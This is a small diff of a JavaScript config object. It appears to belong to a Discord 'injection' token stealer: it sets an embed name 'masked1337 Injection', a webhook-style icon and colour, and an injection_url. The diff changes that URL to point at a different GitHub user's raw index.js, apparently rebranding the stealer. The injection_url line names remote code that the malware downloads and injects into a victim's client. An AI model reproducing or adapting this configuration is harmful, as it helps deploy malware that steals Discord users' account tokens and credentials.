@@ -14,7 +14,7 @@ const config = {
   embed_name: 'masked1337 Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1087556074850222180/1087566307421069332/images_2.jpg?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/masked1337/injection/main/index.js', 
   /**
    
    **/
